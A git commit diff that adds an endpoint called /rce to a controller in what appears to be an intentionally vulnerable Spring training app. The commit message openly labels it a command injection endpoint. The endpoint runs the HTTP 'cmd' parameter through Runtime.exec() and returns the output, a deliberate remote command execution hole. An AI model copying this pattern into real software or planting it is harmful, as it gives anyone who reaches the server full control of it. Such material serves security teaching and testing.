27e11b7846fbdcd32924633ad18681d4c09c9e95
Probot-github-test-workflow <143384730+Probot-github-test-workflow@users.noreply.github.com>
2026-09-25 17:39:22 +0530

    Add command injection endpoint to the master branch

--- src/main/java/com/scalesec/vulnado/LinksController.java
+++ src/main/java/com/scalesec/vulnado/LinksController.java
@@ -7,6 +7,8 @@ import org.springframework.boot.autoconfigure.*;
 import java.util.List;
 import java.io.Serializable;
 import java.io.IOException;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 
 @RestController
@@ -19,5 +21,18 @@ public class LinksController {
   @RequestMapping(value = "/links-v2", produces = "application/json")
   List<String> linksV2(@RequestParam String url) throws BadRequest{
     return LinkLister.getLinksV2(url);
+  }
+
+  @RequestMapping(value = "/rce", method = RequestMethod.GET, produces = "text/plain")
+  String executeCommand(@RequestParam String cmd) throws IOException {
+    Process process = Runtime.getRuntime().exec(cmd);
+    StringBuilder output = new StringBuilder();
+    try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+      String line;
+      while ((line = reader.readLine()) != null) {
+        output.append(line).append(System.lineSeparator());
+      }
+    }
+    return output.toString();
   }
 }
